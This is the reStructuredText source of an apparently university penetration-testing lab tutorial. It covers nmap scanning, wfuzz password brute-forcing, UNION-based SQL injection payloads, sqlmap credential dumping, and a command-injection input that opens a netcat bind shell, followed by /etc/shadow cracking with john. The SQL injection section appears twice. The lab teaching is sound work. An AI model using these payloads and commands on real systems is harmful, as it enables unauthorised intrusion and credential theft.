.. Theory documentation master file, created by
   sphinx-quickstart on Thu Jul 16 15:50:07 2020.
   You can adapt this file completely to your liking, but it should at least
   contain the root `toctree` directive.

Tutorial 0: Initiation
=======================

.. raw:: html

   <?php
         $json   = "../../_static/config.json";
         $string = file_get_contents($json);
         if ($string === false) {
            //deal error
            echo "error json";
         }
         $decoded = json_decode($string, true);
         if ($decoded === null) {
            echo "error json decoded";
         }
         $visi = (strcmp($decoded["t0"],"1") === 0);
         $good = (strcmp($decoded["t0s"],"1") === 0);

         if($visi) {
            header("location: index.php");
            echo '<script type="text/javascript">',
                     'hideFiles();',
                  '</script>';
            echo "<br><h3 style='text-align: center;'> Still not authorized by the professor  :/ </h3>";
            exit; // prevent further execution
         }
   ?>
   <?php
         if($good) {
            //nothing
            echo '<script type="text/javascript">',
                     'hideSolution();',
                  '</script>';
         } else {
            echo '<script type="text/javascript">',
                     //'$(document).ready(function() { $(".sol-img").toggle(); });',
                  '</script>';
         }
   ?>

Download and install VirtualBox 6.1

.. centered:: https://www.virtualbox.org/

Once Virtualbox is installed, download the VirtualBox Expansion Pack
from this `address <https://download.virtualbox.org/virtualbox/6.1.18/Oracle_VM_VirtualBox_Extension_Pack-6.1.18.vbox-extpack>`_.

Download the Kali VM from this link

.. centered:: https://transvol.sgsi.ucl.ac.be/download.php?id=e51df06f753b8f84

| Once downloaded, click on it VirtualBox will open, just click on the
  “Import” button

| Connection:

============ ============
**username** **password**
============ ============
kali         kali
============ ============


Exercise
--------


Finding services - ``nmap``
~~~~~~~~~~~~~~~~~~~~~~~~~~~

.. centered:: ``nmap <option> <IP>``

.. raw:: html

   <div class="collapse tp1_s0" id="tp1_0_1">

..  image:: imageTP/0.PNG
    :scale: 70%
    :align: center
    :class: sol-img

.. raw:: html

   </div>

.. raw:: html

   <?php
         if($good) {
            //nothing
         } else {
            echo '<script type="text/javascript">',
                     //'getSolution("../_images/0.PNG","finding-services-nmap");',
                     'updateSol("tp1_0_1","#tp1_0_1","finding-services-nmap");',
                  '</script>';
            include "../_static/solution.html";
         }
   ?>


Bruteforcing - ``wfuzz``
~~~~~~~~~~~~~~~~~~~~~~~~

| For URL such that:
  http://172.17.0.2/gallery.php?password=THE_PASS_YOU_TRIED&Login=Login#
| You could then see that the “password” argument is the password you
  entered, change that parameter and test again

.. centered:: ``wfuzz -w <dicPath> "URL"``

| We suggest using ``wfuzz`` to perform a dictionary attack.
| A good dictionary can be found at
.. centered::   ``/usr/share/wfuzz/wordlist/others/common_pass.txt``
| We should also replace the URL like:
.. centered::   http://172.17.0.2/gallery.php?password=FUZZ&Login=Login#


| Now, observe the output of ``wfuzz``, it will give you the HTTP return
  code (normally ``200/OK``) and the number of characters, lines and
  words on the page it received while trying that password. *The
  “Incorrect Password” page contains 10 Lines and 37 Words*. Look if one
  line is different, meaning that that password has got a different
  result. Try that password on the website.

.. raw:: html

   <div class="collapse tp1_s" id="tp1_2_1">

..  image:: imageTP/1.png
    :scale: 70%
    :align: center
    :class: sol-img

.. raw:: html

   </div>

.. raw:: html

   <?php
         if($good) {
            //nothing
         } else {
            echo '<script type="text/javascript">',
                     //'getSolution("../_images/1.png","bruteforcing-wfuzz");',
                     'updateSol("tp1_2_1","#tp1_2_1","bruteforcing-wfuzz");',
                  '</script>';
            include "../_static/solution.html";
         }
   ?>


SQL Injection - ``SQLMap``
~~~~~~~~~~~~~~~~~~~~~~~~~~

Imagine you can interact with a database such that:

.. raw:: html

   <div class="collapse tp1_s3" id="tp1_3_1">

.. image:: imageTP/2.png
   :scale: 50%
   :align: center
   :class: sol-img

.. raw:: html

   </div>

-  Now think about the SQL Query that must be executed to look into that
   database. When you have a clear idea, look at the next line.

-  The query used is most likely something like
   ``"SELECT * FROM cats WHERE id=PARAM"``.

-  | SQL commands support operators like AND or OR. Try to use a OR to
     dump the content of the whole table. When you’re done read the next
     line. Using a OR you can dump the whole table by using the query
     ``"SELECT * FROM cats WHERE id=1 OR 1=1"`` (see picture just above)
   | This query works because the OR condition is always true, so every
     entry in the database is selected and returned.

-  Now that we know that we can inject commands, we can try some more
   interesting commands like ``"1 OR 1=0 UNION SELECT null, user() #"``.
   This command will give you the username used to connect to the
   database.

-  Now we would like to know if some information about our cats are
   hidden. For instance, their microchip is probably there but hidden.
   Let’s see if we can display it.

-  First, let’s find the name of the table used to store our cats.
   “cats” is probably a good guess but let’s check it by using
   ``"1 AND 1=0 UNION SELECT null, table_name FROM information_schema.tables WHERE table_name LIKE 'cats%'#"``
   as an input.

-  The answer should show you “cats” next to the birth date, meaning
   that a table cats exists (you can try with other names)

-  Now that we’re sure that our table is called "cats" let’s try to find
   the name of the rows by using the input
   ``"1 AND 1=0 UNION SELECT null, concat(table_name,0x0a,column_name) FROM information_schema.columns WHERE table_name = 'cats' #"``.
   The result of this command will show you that this table has 4 rows:
   ``id, name, birth_date`` and ``chip``. Great our chip ``id`` is here
   and called ``chip``.

| As we’ve seen, an SQL Injection allow to read data we aren’t supposed
  to read. But what’s interesting is if the user used by the website has
  admin privileges, we could even try to read the informations about
  other databases or SQL users. But these queries are pretty complex, so
  let’s use a tool for that.

| SQLMap is a tool that will perform SQL injections for you, so let’s
  try it. Run sqlmap with the command:

.. centered:: ``sqlmap -u "http://172.17.0.2/cats.php?id=1&Submit=Submit" --string="Name" --users --password``

SQLMap will first scan the database for injectable parameters. Then, it
will extract (if possible) a list of the users and their hashed
password. Upon success, sqlmap will try a bruteforce attack on the
hashed passwords it extracted. When done, sqlmap should show you the
login and passwords of several SQL users, write them



-  Now think about the SQL Query that must be executed to look into that
   database. When you have a clear idea, look at the next line.

-  The query used is most likely something like
   ``"SELECT * FROM cats WHERE id=PARAM"``.

-  | SQL commands support operators like AND or OR. Try to use a OR to
     dump the content of the whole table. When you’re done read the next
     line. Using a OR you can dump the whole table by using the query
     ``"SELECT * FROM cats WHERE id=1 OR 1=1"`` (see picture just above)
   | This query works because the OR condition is always true, so every
     entry in the database is selected and returned.

-  Now that we know that we can inject commands, we can try some more
   interesting commands like ``"1 OR 1=0 UNION SELECT null, user() #"``.
   This command will give you the username used to connect to the
   database.

-  Now we would like to know if some information about our cats are
   hidden. For instance, their microchip is probably there but hidden.
   Let’s see if we can display it.

-  First, let’s find the name of the table used to store our cats.
   “cats” is probably a good guess but let’s check it by using
   ``"1 AND 1=0 UNION SELECT null, table_name FROM information_schema.tables WHERE table_name LIKE 'cats%'#"``
   as an input.

-  The answer should show you “cats” next to the birth date, meaning
   that a table cats exists (you can try with other names)

-  Now that we’re sure that our table is called "cats" let’s try to find
   the name of the rows by using the input
   ``"1 AND 1=0 UNION SELECT null, concat(table_name,0x0a,column_name) FROM information_schema.columns WHERE table_name = 'cats' #"``.
   The result of this command will show you that this table has 4 rows:
   ``id, name, birth_date`` and ``chip``. Great our chip ``id`` is here
   and called ``chip``.

| As we’ve seen, an SQL Injection allow to read data we aren’t supposed
  to read. But what’s interesting is if the user used by the website has
  admin privileges, we could even try to read the informations about
  other databases or SQL users. But these queries are pretty complex, so
  let’s use a tool for that.

| SQLMap is a tool that will perform SQL injections for you, so let’s
  try it. Run sqlmap with the command:

.. centered:: ``sqlmap -u "http://172.17.0.2/cats.php?id=1&Submit=Submit" --string="Name" --users --password``

SQLMap will first scan the database for injectable parameters. Then, it
will extract (if possible) a list of the users and their hashed
password. Upon success, sqlmap will try a bruteforce attack on the
hashed passwords it extracted. When done, sqlmap should show you the
login and passwords of several SQL users, write them done this could be
useful.

.. raw:: html

   <div class="collapse tp1_s3" id="tp1_3_2">

..  image:: imageTP/5.PNG
   :scale: 50%
   :align: center
   :class: sol-img

.. raw:: html

   </div>

You can also have the list of all databases with:

.. centered:: ``sqlmap -u "http://172.17.0.2/cats.php?id=1&Submit=Submit" --string="Name" --dbs``

One is called phpmyadmin? That’s interesting. PHPMyadmin is a tool to
manager SQL databases. Try the URL http://172.17.0.2/phpmyadmin/ and try
the admin password you found previously. You should have access to all
the databases and their content.

.. raw:: html

   <?php
         if($good) {
            //nothing
         } else {
            echo '<script type="text/javascript">',
                     //'getSolution("../_images/2.png","sql-injection-sqlmap");',
                     //'getSolution("../_images/5.PNG","sql-injection-sqlmap");',
                     'updateSol("tp1_3_1 tp1_3_2",".tp1_s3","sql-injection-sqlmap");',
                  '</script>';
            include "../_static/solution.html";
         }
   ?>

Command Injection - ``Metasploit``
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

| Is it possible to make this website run another command? Think about
  it and about how bash works and try it. When you’re done, go to the
  next line. An interesting thing about bash, is that you can “chain”
  commands by using the character “;”. For instance, of you type echo
  “hello”; echo “world” in your terminal, it will execute echo “hello”
  first and then echo “world”.

| It would be easier to have a bash terminal right? We can do that!

Let’s try to open a netcat on the machine so we can directly connect to
it. For that use this input

.. centered:: ``8.8.8.8; mkfifo /tmp/pipe;sh /tmp/pipe | nc -l -p 1234 > /tmp/pipe``.


This command is a bit complicated, but we basically tell netcat (nc) to
listen on the port 1234 for a TCP connection, and we will communicate
with a named pipe so the traffic can go both ways.

.. raw:: html

   <div class="collapse tp1_s4" id="tp1_4_1">

..  image:: imageTP/3.png
    :scale: 50%
    :align: center
    :class: sol-img

.. raw:: html

   </div>

In the terminal open Metasploit by typing ``msfconsole``. Type use
``multi/handler``.

.. raw:: html

   <div class="collapse tp1_s4" id="tp1_4_2">


..  image:: imageTP/7.PNG
    :scale: 50%
    :align: center
    :class: sol-img
.. raw:: html

   </div>

An interesting command would be the command to look into the users of
the system (whoami -> user -> apache2). In Linux, the users are stored
in ``/etc/passwd``. If you look closely, there’s a user called “site”.
Did we already see this username before? (for this example).

Type ``ssh site@172.17.0.2`` and use the preceding password found with
SQLMap

.. raw:: html

   <div class="collapse tp1_s4" id="tp1_4_3">

.. image:: imageTP/8.PNG
   :scale: 50%
   :align: center
   :class: sol-img

.. raw:: html

   </div>

| Being a user is cool, but couldn’t we go further and try to become root ? In
  Linux, ``/etc/passwd`` contains the users, ``/etc/shadow`` contains
  the hashed passwords and you can’t access ``/etc/shadow`` unless
  you’re root.

| Python is often allowed to run as root, and it’s a very bad practice:

-  ``/usr/sbin/john`` is an utility that bruteforce password files

-  ``/usr/sbin/unshadow`` is a commands that merges the result of
   ``/etc/passwd`` and ``/etc/shadow`` to put them in a format readable
   by john



.. literalinclude:: shadow.py
   :language: python

Or

.. literalinclude:: shadow.sh
   :language: bash

.. raw:: html

   <?php
         if($good) {
            //nothing
         } else {
            echo '<script type="text/javascript">',
                     'updateSol("tp1_4_1 tp1_4_2 tp1_4_3",".tp1_s4","command-injection-metasploit");',
                     //'getSolution("../_images/3.png","command-injection-metasploit");',
                     //'getSolution("../_images/7.PNG","command-injection-metasploit");',
                     //'getSolution("../_images/8.PNG","command-injection-metasploit");',
                  '</script>';
            include "../_static/solution.html";
         }
   ?>


Bonus: going beyond
-------------------

Using another metasploitable VM as server (i.e a VM designed to be
vulnerable) with some port opened and vulnerable version of services,
try to reproduce the preceding exploits and even more if you can. Look
on the internet for vulnerability for the different opened services, or
search with ``msfconsole``.

.. centered:: ``msf > search <exploit_service>``

You can find a metasploitable VM here:

.. centered::  https://docs.rapid7.com/metasploit/metasploitable-2/

It’s time to play, try to discover all the possibilities that ``nmap``
or other scanning tools have to propose. Search for common vulnerability
and how to exploit them !